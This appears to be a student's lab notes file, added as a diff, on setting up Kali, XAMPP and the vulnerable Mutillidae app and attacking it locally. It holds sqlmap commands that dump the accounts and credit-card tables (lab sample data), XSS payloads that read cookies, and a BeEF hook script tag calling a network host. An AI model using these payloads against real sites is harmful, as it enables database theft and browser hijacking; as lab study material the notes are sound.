@@ -1,0 +1,247 @@
+#CONFIGURE SSH VIA REMOTE ON KALI:
+Step 1: Install the OpenSSH Server
+	sudo apt update
+
+    sudo apt install openssh-server
+	
+Step 2: Start the SSH Service
+
+	sudo systemctl start ssh
+	
+Step 3: Enable SSH to Start on Boot
+
+	sudo systemctl enable ssh
+	
+Step 4: Verify SSH is Running
+
+	sudo systemctl status ssh
+	sudo systemctl restart ssh
+	/etc/ssh/sshd_config
+	
+
+TASK1: install xampp of linux:
+
+download xampp for linux in kali downloads folder:
+
+sudo chmod +x xampp-linux-x64-8.0.30-0-installer.run 
+sudo ./xampp-linux-x64-8.0.30-0-installer.run 
+cd /opt/lampp
+sudo ./lampp start
+./lampp help
+sudo ./manager-linux-x64.run
+sudo ./uninstall
+
+http://127.0.0.1/mutillidae/src/index.php
+
+
+TASK2: InSTALL DOCKER IN LINUX:
+sudo apt update
+
+sudo apt install docker.io
+sudo apt install podman-docker
+sudo apt --fix-broken install
+
+systemctl enable docker --now
+
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+TASK3: SQL DATABASE INJECTIONS:
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+https://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson9/index.html
+https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
+
+Y
+
+sqlmap attack:
+
+sqlmap --url="https://127.0.0.1/mutillidae/src/index.php?page=user-info.php&username=blotot&password=pass&user-info-php-submit-button=View+Account+Details" --current-db
+
+y
+
+> 0
+[11:18:32] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 8.0.30, PHP, Apache 2.4.58
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[11:18:32] [INFO] fetching current database
+current database: 'mutillidae'
+[11:18:32] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/127.0.0.1'
+
+[*] ending @ 11:18:32 /2024-09-04/
+
+sqlmap -u target
+--current-db
+-D mutillidae
+-D mutillidae -T accounts
+
+sqlmap --url="https://127.0.0.1/mutillidae/src/index.php?page=user-info.php&username=blotot&password=pass&user-info-php-submit-button=View+Account+Details" -D mutillidae --tables
+no
+0
+
+Database: mutillidae
+[12 tables]
++----------------------------+
+| accounts                   |
+| blogs_table                |
+| captured_data              |
+| credit_cards               |
+| help_texts                 |
+| hitlog                     |
+| level_1_help_include_files |
+| page_help                  |
+| page_hints                 |
+| pen_test_tools             |
+| user_poll_results          |
+| youTubeVideos              |
++----------------------------+
+
+sqlmap --url="https://127.0.0.1/mutillidae/src/index.php?page=user-info.php&username=blotot&password=pass&user-info-php-submit-button=View+Account+Details" -D mutillidae -T accounts
+sqlmap --url="https://127.0.0.1/mutillidae/src/index.php?page=user-info.php&username=blotot&password=pass&user-info-php-submit-button=View+Account+Details" -D mutillidae -T accounts --dump
+Y
+0
+
+Database: mutillidae
+Table: accounts
+[25 entries]
++-----+----------+---------------+--------------+----------+-----------+-----------------------------------------+
+| cid | is_admin | lastname      | password     | username | firstname | mysignature                             |
++-----+----------+---------------+--------------+----------+-----------+-----------------------------------------+
+| 1   | TRUE     | Administrator | adminpass    | admin    | System    | g0t r00t?                               |
+| 2   | TRUE     | Crenshaw      | somepassword | adrian   | Adrian    | Zombie Films Rock!                      |
+| 3   | FALSE    | Pentest       | monkey       | john     | John      | I like the smell of confunk             |
+| 4   | FALSE    | Druin         | password     | jeremy   | Jeremy    | d1373 1337 speak                        |
+| 5   | FALSE    | Galbraith     | password     | bryce    | Bryce     | I Love SANS                             |
+| 6   | FALSE    | WTF           | samurai      | samurai  | Samurai   | Carving fools                           |
+| 7   | FALSE    | Rome          | password     | jim      | Jim       | Rome is burning                         |
+| 8   | FALSE    | Hill          | password     | bobby    | Bobby     | Hank is my dad                          |
+| 9   | FALSE    | Lion          | password     | simba    | Simba     | I am a super-cat                        |
+| 10  | FALSE    | Evil          | password     | dreveil  | Dr.       | Preparation H                           |
+| 11  | FALSE    | Evil          | password     | scotty   | Scotty    | Scotty do                               |
+| 12  | FALSE    | Calipari      | password     | cal      | John      | C-A-T-S Cats Cats Cats                  |
+| 13  | FALSE    | Wall          | password     | john     | John      | Do the Duggie!                          |
+| 14  | FALSE    | Johnson       | 42           | kevin    | Kevin     | Doug Adams rocks                        |
+| 15  | FALSE    | Kennedy       | set          | dave     | Dave      | Bet on S.E.T. FTW                       |
+| 16  | FALSE    | Pester        | tortoise     | patches  | Patches   | meow                                    |
+| 17  | FALSE    | Paws          | stripes      | rocky    | Rocky     | treats?                                 |
+| 18  | FALSE    | Tomes         | lanmaster53  | tim      | Tim       | Because reconnaissance is hard to spell |
+| 19  | TRUE     | Baker         | SoSecret     | ABaker   | Aaron     | Muffin tops only                        |
+| 20  | FALSE    | Pan           | NotTelling   | PPan     | Peter     | Where is Tinker?                        |
+| 21  | FALSE    | Hook          | JollyRoger   | CHook    | Captain   | Gator-hater                             |
+| 22  | FALSE    | Jardine       | i<3devs      | james    | James     | Occupation: Researcher                  |
+| 23  | FALSE    | Skoudis       | pentest      | ed       | Ed        | Commandline KungFu anyone?              |
+| 24  | NULL     | NULL          | pass         | rob      | NULL      | hello                                   |
+| 25  | NULL     | NULL          | pass         | blotot   | NULL      | butut                                   |
++-----+----------+---------------+--------------+----------+-----------+-----------------------------------------+
+
+[11:49:37] [INFO] table 'mutillidae.accounts' dumped to CSV file '/home/kali/.local/share/sqlmap/output/127.0.0.1/dump/mutillidae/accounts.csv'
+[11:49:37] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/127.0.0.1'
+
+
+sqlmap --url="https://127.0.0.1/mutillidae/src/index.php?page=user-info.php&username=blotot&password=pass&user-info-php-submit-button=View+Account+Details" -D mutillidae -T credit_cards --dump
+Y
+0
+
+[11:56:10] [INFO] the back-end DBMS is MySQL
+web application technology: Apache 2.4.58, PHP 8.0.30, PHP
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[11:56:10] [INFO] fetching columns for table 'credit_cards' in database 'mutillidae'
+[11:56:10] [WARNING] reflective value(s) found and filtering out
+[11:56:11] [INFO] fetching entries for table 'credit_cards' in database 'mutillidae'
+Database: mutillidae
+Table: credit_cards
+[5 entries] 
++------+-----+------------------+------------+
+| ccid | ccv | ccnumber         | expiration |
++------+-----+------------------+------------+
+| 1    | 745 | 4444111122223333 | 2012-03-01 |
+| 2    | 722 | 7746536337776330 | 2015-04-01 |
+| 3    | 461 | 8242325748474749 | 2016-03-01 |
+| 4    | 230 | 7725653200487633 | 2017-06-01 |
+| 5    | 627 | 1234567812345678 | 2018-11-01 |
++------+-----+------------------+------------+
+
+
+
+
+
+
+
+
+
+TASK3: XSS SCRIPTING VIA COOKIES:
+
+2kinds of xss scripting:
+1.reflected: web redirecte
+2.stored: your js is stored in db/backend 
+
+C:\users\rob\AppData\Local\Google\Chrome\User Data\Default
+
+<h1>Hello</h1>
+
+<script>alert("xss is very possible!!! hahaha")</script>
+
+view page source:
+
+<script>alert(document.cookie)</script>
+
+
+<input type="text name="colour" value=" " />
+
+FF0000">
+
+<input type="text name="colour" value=" " />
+
+FF0000"><script>alert("xss")</script>
+
+<input type="text name="colour" value=" " />
+
+stored XSS:
+
+Lab1:
+./beef
+
+[10:04:55][*] running on network interface: 127.0.0.1
+[10:04:55]    |   Hook URL: http://127.0.0.1:3000/hook.js
+[10:04:55]    |_  UI URL:   http://127.0.0.1:3000/ui/panel
+[10:04:55][*] running on network interface: 192.168.108.132
+[10:04:55]    |   Hook URL: http://192.168.108.132:3000/hook.js
+[10:04:55]    |_  UI URL:   http://192.168.108.132:3000/ui/panel
+
+
+<script src="http://192.168.108.132:3000/hook.js"></script>
+
+
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+ATTACK NO 3:  BUFFER OVERFLOW:
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Buffer Overflow may occcur when input is too large to fit inside the space allocated.
+
+Variables and arguments are limited in the amount of information they can hold before the 
+amount of data (or the cardinality) exceeds to capacity of the variable.
+ An unsigned byte can hold the number 255, but the number 256 will either cause an error,
+ be cast to a different representation, or "roll" the variable back to zero.
+
+Exploitation:
+Narrow down the exact length of input that overflows a vulnerable input parameter.
+
+
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+ATTACK NO 4:  MITM attack
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+
+
+
+
+
+
+
+
+
+
